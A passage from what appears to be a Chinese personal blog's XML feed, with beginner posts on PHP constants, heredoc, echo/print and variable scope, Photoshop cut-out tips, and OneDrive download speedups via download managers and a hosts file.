id="常量是全局的"><a href="#常量是全局的" class="headerlink" title="常量是全局的"></a>常量是全局的</h2><blockquote><p>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</p></blockquote><p>以下实例演示了在函数内使用常量，即便常量定义在函数外也可以正常使用常量。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"WORLD"</span><span class="token punctuation">,</span> <span class="token string">"常量值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">MyTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token constant">WORLD</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token function">MyTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出:</span><span class="token comment" spellcheck="true">//常量值</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP之定界符EOF</title>
      <link href="/posts/14806.html"/>
      <url>/posts/14806.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-EOF-heredoc-详解"><a href="#PHP-EOF-heredoc-详解" class="headerlink" title="PHP EOF(heredoc) 详解"></a>PHP EOF(heredoc) 详解</h1><blockquote><p>EOF（Heredoc）技术，我的理解就是可以用它包裹HTML和JavaScript脚本进行大段的输出代码，使代码看上去简洁美观，从而提高效率。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token comment" spellcheck="true">//开始后面不能有空格。</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>这里是<span class="token constant">HTML</span>代码<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span></span>原格式输出，不需要使用br标签，来换行<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span></span><span class="token constant">EOF</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//结束必须独立一行，且必须顶格靠边，其前面不能有空格。</span><span class="token delimiter">?></span></code></pre><p><strong>注意：</strong></p><p>1.以 <code>&lt;&lt;&lt;EOF</code> 开始标记开始，以 <code>EOF;</code>结束标记结束，结束标记必须顶头写，不能有缩进和空格，且在结束标记末尾要有分号 。</p><p>2.开始标记和开始标记相同，比如常用大写的EOT、EOD、EOF来表示，但是不只限于那几个，只要保证开始标记和结束标记不在正文中出现即可。</p><p>3.位于开始标记和结束标记之间的变量可以被正常解析，但是函数则不可以。</p><p>在 heredoc 中，<code>变量不需要用连接符</code> . 或 , 来拼接，如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token string">"0"</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token string">"E"</span><span class="token punctuation">;</span><span class="token variable">$z</span><span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span> <span class="token string">"L"</span><span class="token variable">$x</span><span class="token string">"V"</span><span class="token variable">$y</span>"<span class="token constant">EOF</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$z</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结果连同双引号一起输出："L"0"V"E" </span> <span class="token delimiter">?></span></code></pre><p>4.<code>Heredoc</code>常用在输出包含大量HTML语法d文档的时候。</p><p>比如自定义函数<code>youtxt()</code> ,要输出HTML 超文本的时候，可以有以下两种写法 ：</p><p><strong>第一种：</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function">youtxt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;html>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;head>&lt;title> HTML标题 &lt;/title>&lt;/head>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;body> HTML内容 &lt;/body>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/html>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><strong>第二种：</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">youtxt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOT</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span> <span class="token constant">HTML</span>标题<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span> <span class="token constant">HTML</span>内容 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token constant">EOT</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">youtxt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>从上面两种输出方式中，我们可以看出。显然是第二种方法更便于阅读和编写。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP之两种输出方式</title>
      <link href="/posts/49496.html"/>
      <url>/posts/49496.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>echo 和 print 语句的区别：</p><ul><li><p>echo 可以输出一个或者多个字符串</p></li><li><p>print  只允许输出一个字符串，返回值为1</p><ul><li>之所以echo输出的速度比print快，是因为echo没有返回值。</li></ul></li></ul><p>echo 和 print 是一个语言结构，在使用的时候加不加括号都可以的。</p></blockquote><h1 id="echo-输出字符串"><a href="#echo-输出字符串" class="headerlink" title="echo 输出字符串"></a>echo 输出字符串</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;h1>你好，世界！&lt;/h1>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Hello World!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"我是一个"</span><span class="token punctuation">,</span><span class="token string">"字符串，"</span><span class="token punctuation">,</span><span class="token string">"使用了"</span><span class="token punctuation">,</span><span class="token string">"多个"</span><span class="token punctuation">,</span><span class="token string">"参数。"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="echo输出字符串和变量"><a href="#echo输出字符串和变量" class="headerlink" title="echo输出字符串和变量"></a>echo输出字符串和变量</h2><pre class=" language-php"><code class="language-php"><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"你好，世界！"</span><span class="token punctuation">;</span><span class="token variable">$domain</span> <span class="token operator">=</span> <span class="token string">"WWW.THECAT.TOP"</span><span class="token punctuation">;</span><span class="token variable">$cars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"BMW"</span><span class="token punctuation">,</span><span class="token string">"Volvo"</span><span class="token punctuation">,</span><span class="token string">"Toyota"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$txt"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"我的域名是：$domain"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"理想的座驾：{$cars[0]}"</span><span class="token punctuation">;</span></code></pre><h1 id="print-输出字符串"><a href="#print-输出字符串" class="headerlink" title="print 输出字符串"></a>print 输出字符串</h1><pre class=" language-php"><code class="language-php"><span class="token keyword">print</span> <span class="token string">"&lt;h1>你好 世界！&lt;/h1>"</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">Print</span> <span class="token string">"浮躁，繁荣de，World，我什么时候才能静下心来学习？"</span><span class="token punctuation">;</span></code></pre><h2 id="print-输出字符串和变量"><a href="#print-输出字符串和变量" class="headerlink" title="print 输出字符串和变量"></a>print 输出字符串和变量</h2><pre class=" language-php"><code class="language-php"><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"一身清贫怎敢入繁华！"</span><span class="token punctuation">;</span><span class="token variable">$txt0</span> <span class="token operator">=</span> <span class="token string">"How dare two sleeve breeze miss the beauty!"</span><span class="token punctuation">;</span><span class="token variable">$cars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"三生有幸copy怎敢遇见你，"</span><span class="token punctuation">,</span><span class="token string">"四目相对怎敢目无你，"</span><span class="token punctuation">,</span><span class="token string">"五行皆空怎敢奢求你，"</span><span class="token punctuation">,</span><span class="token string">"六道轮百回怎敢忘度记你。"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"$txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"$txt0,二袖清风怎敢误佳人！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{$cars[0]}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{$cars[1]}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{$cars[2]}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{$cars[3]}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP语法及变量篇</title>
      <link href="/posts/7597.html"/>
      <url>/posts/7597.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP语法"><a href="#PHP语法" class="headerlink" title="PHP语法"></a>PHP语法</h1><h2 id="PHP声明编码格式"><a href="#PHP声明编码格式" class="headerlink" title="PHP声明编码格式"></a>PHP声明编码格式</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="HTML背景变黑文字变白代码："><a href="#HTML背景变黑文字变白代码：" class="headerlink" title="HTML背景变黑文字变白代码："></a>HTML背景变黑文字变白代码：</h2><pre><code>    &lt;body bgcolor="#000000"&gt;    &lt;!-- 黑色背景 --&gt;    &lt;font style="color:#FFFFFF"&gt;  &lt;!-- 字体变白 --&gt;</code></pre><h2 id="PHP基础语法："><a href="#PHP基础语法：" class="headerlink" title="PHP基础语法："></a>PHP基础语法：</h2><pre class=" language-php"><code class="language-php"><span class="token string">"print"</span> 要加括号<span class="token string">"echo"</span>  括号可加可不加 不影响自定义函数都需要加括号<span class="token string">"include"</span> 和 <span class="token string">"require"</span> 括号可加可不加 不影响  </code></pre><h2 id="PHP注释符号："><a href="#PHP注释符号：" class="headerlink" title="PHP注释符号："></a>PHP注释符号：</h2><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//PHP单行注释</span><span class="token comment" spellcheck="true">/*PHP多行注释*/</span></code></pre><h2 id="PHP语句结构："><a href="#PHP语句结构：" class="headerlink" title="PHP语句结构："></a>PHP语句结构：</h2><ul><li>PHP以<code>&lt;?php</code> 开始 <code>?&gt;</code>结尾</li><li>PHP代码可以嵌入HTML文档中使用</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h1 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h1><ul><li>变量是用于存储信息的”容器”</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//分别给 $a 和 $b 赋值 1,2  </span><span class="token comment" spellcheck="true">//在PHP中这些字母都被称为 变量</span></code></pre><blockquote><p>PHP 变量规则：</p><p> -变量以 符号开始，后面跟着变量的名称 (名称可以简短 也可是描述性的) </p><p>-变量名必须以字母或者下划线字符开始 </p><p>-变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</p><p> -变量名不能包含空格</p><p> -变量名是区分大小写的（y 和 $Y 是两个不同的变量）</p><p>——PHP 语句和 PHP 变量都是区分大小写的。</p></blockquote><p>声明PHP变量：</p><ul><li>变量在第一次赋值给它的时候创建</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h1 id="PHP变量作用域"><a href="#PHP变量作用域" class="headerlink" title="PHP变量作用域"></a>PHP变量作用域</h1><ul><li>local</li><li>global</li><li>static</li><li>parameter</li></ul><h2 id="PHP-global-关键字"><a href="#PHP-global-关键字" class="headerlink" title="PHP global 关键字"></a>PHP global 关键字</h2><p>global 关键字用于函数内访问全局变量。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">333</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">333</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">;</span>    <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 666</span><span class="token delimiter">?></span></code></pre><h2 id="Static-作用域"><a href="#Static-作用域" class="headerlink" title="Static 作用域"></a>Static 作用域</h2><p>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用  <strong>static</strong>  关键字：</p><ul><li><code>PHP_EOL</code> 换行符</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span>    <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 换行符</span><span class="token punctuation">}</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><blockquote><p><code>++</code> 循环</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ps技巧</title>
      <link href="/posts/24518.html"/>
      <url>/posts/24518.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、快速抠出透明的杯子，并且保持质感。"><a href="#一、快速抠出透明的杯子，并且保持质感。" class="headerlink" title="一、快速抠出透明的杯子，并且保持质感。"></a>一、快速抠出透明的杯子，并且保持质感。</h1><p>1、拷贝背景（保护原有图像不受损坏）</p><p>2、ctrl shift n 创建透明图层。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406015205.png" alt=""></p><p>3、R图层——红通道；G图层——绿通道；B图层——蓝通道。</p><p>操作方法：</p><p>0x1</p><p>选中背景 ctrl i反相。</p><p>0x2</p><p>选中R图层，切换到通道，选中红通道。按CTRL 鼠标左键点击通道缩略图从而选中玻璃杯，回到通道RGB进行颜色的填充。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406015210.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406015206.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406015211.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406015207.png" alt=""></p><p>4、完成</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406015208.png" alt=""></p><blockquote><p>容易出现的问题：</p><p>选完滤色混合模式，发现杯子是荧光蓝，这是因为没有关闭R、G通道填充颜色导致的。</p></blockquote><h1 id="二、扣取毛发"><a href="#二、扣取毛发" class="headerlink" title="二、扣取毛发"></a>二、扣取毛发</h1><p>1、利用选择并遮住主体扣取毛发</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406105230.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406105229.png" alt=""></p><h1 id="三、扣取半透明状的物体"><a href="#三、扣取半透明状的物体" class="headerlink" title="三、扣取半透明状的物体"></a>三、扣取半透明状的物体</h1><p>1、将素材拖入到另一个图层，使用滤色混合模式即可扣取。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406105420.png" alt=""></p><p>2、使用蒙版扣取</p><p>在背景图层上添加一个图层蒙版，回到背景图像ctrl a全选ctrl c复制；随后按住alt键鼠标左键点击蒙版进入蒙版，ctrl v粘贴图像。最后回到图像图层就扣好了。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406105419.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406105421.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406105417.png" alt=""></p><p>半透明的烟雾，婚纱都可以使用此方法扣取。只能扣取半透明的图像。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200406105418.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 平面设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OneDrive国内提速方案</title>
      <link href="/posts/5633.html"/>
      <url>/posts/5633.html</url>
      
        <content type="html"><![CDATA[<h1 id="微软网盘-OneDrive-下载提速方案"><a href="#微软网盘-OneDrive-下载提速方案" class="headerlink" title="微软网盘(OneDrive)下载提速方案"></a>微软网盘(OneDrive)下载提速方案</h1><blockquote><p>测试的带宽50MB。</p></blockquote><h3 id="EagleGet提速"><a href="#EagleGet提速" class="headerlink" title="EagleGet提速"></a>EagleGet提速</h3><p>1)：去星愿浏览器官网下载星愿浏览器：<a href="https://www.twinkstar.com/" target="_blank" rel="noopener">https://www.twinkstar.com/</a>下载Win版本并安装。</p><p>2)：去eagleget官方下载eagleget猎鹰下载器：<a href="http://www.eagleget.com/" target="_blank" rel="noopener">http://www.eagleget.com/</a>下载Win版本并安装。</p><p>3)：打开星愿浏览器开启配置eagleget猎鹰下载工具，。将插件导入即可。或者安装下载器。</p><ul><li><p>安装下载器</p></li><li><p>安装插件</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330110317.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330112131.png" alt=""></p><p><strong>提示：</strong></p><p>如果你用的是谷歌浏览器，可以不用下载星愿浏览器，可以在谷歌应用商店里搜索这个下载器插件，效果几乎是一样的，因为星愿浏览器采用的是Chrome内核。</p><p><strong>效果：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330110316.png" alt=""></p><h3 id="IDM提速"><a href="#IDM提速" class="headerlink" title="IDM提速"></a>IDM提速</h3><p>也能起到提速的作用。</p><p><strong>效果：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330112133.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330112132.png" alt=""></p><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><pre><code># Onedrive通用13.107.42.12 d.docs.live.net13.107.42.12 docs.live.net# Onedrive客户端13.107.42.12 api.onedrive.com13.107.42.12 public.bn.files.1drv.com13.107.42.12 public.dm.files.1drv.com40.90.136.163 skydrivesync.policies.live.net157.55.109.230 skydrivesync.policies.live.net40.77.224.8 skydrivesync.policies.live.net104.74.21.118 oneclient.sfx.ms23.1.189.37 oneclient.sfx.ms23.56.30.148 oneclient.sfx.ms52.114.88.20 mobile.pipe.aria.microsoft.com52.114.132.73 mobile.pipe.aria.microsoft.com52.114.77.33 mobile.pipe.aria.microsoft.com40.90.136.166 storage.live.com157.55.109.226 storage.live.com40.90.136.1 storage.live.com52.242.211.89 skydrive.wns.windows.com52.139.250.253 skydrive.wns.windows.com40.90.189.152 skydrive.wns.windows.com# Onedrive for Business客户端#13.107.136.9 jia666-my.sharepoint.com#13.107.6.151 jia666-my.sharepoint.com#请将**改成自己所在域的域名,没听过的话请删除这条# Onenote UWP客户端52.109.132.2 contentsync.onenote.com52.109.48.2 contentsync.onenote.com52.109.44.3 contentsync.onenote.com52.109.48.0 www.onenote.com52.109.2.10 www.onenote.com52.109.44.1 www.onenote.com23.57.112.187 c1-onenote-15.cdn.office.net23.219.32.184 c1-onenote-15.cdn.office.net104.75.165.28 c1-onenote-15.cdn.office.net52.109.56.33 ocws.officeapps.live.com52.109.124.103 ocws.officeapps.live.com52.109.20.5 ocws.officeapps.live.com52.109.2.18 roaming.officeapps.live.com52.109.56.34 roaming.officeapps.live.com52.109.120.3 roaming.officeapps.live.com23.65.34.111 contentstorage.osi.office.net23.41.47.209 contentstorage.osi.office.net184.84.56.175 contentstorage.osi.office.net</code></pre><h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><table><thead><tr><th>下载类</th><th>软件描述</th><th>直通车</th><th>官网</th></tr></thead><tbody><tr><td>EagleGet</td><td>免费、EagleGet使用先进的多线程技术，通过将文件分成多个部分然后同时传输来加速下载，从而使下载速度提高了6倍！<strong><a href="https://www.lanzous.com/iase0xa" target="_blank" rel="noopener">插件</a></strong></td><td><a href="https://www.lanzous.com/iasdwpi" target="_blank" rel="noopener">蓝走运下载</a></td><td><a href="http://www.eagleget.com/" target="_blank" rel="noopener">官网</a></td></tr><tr><td>IDM</td><td>多线程下载</td><td><a href="https://www.lanzous.com/b0bq9893c" target="_blank" 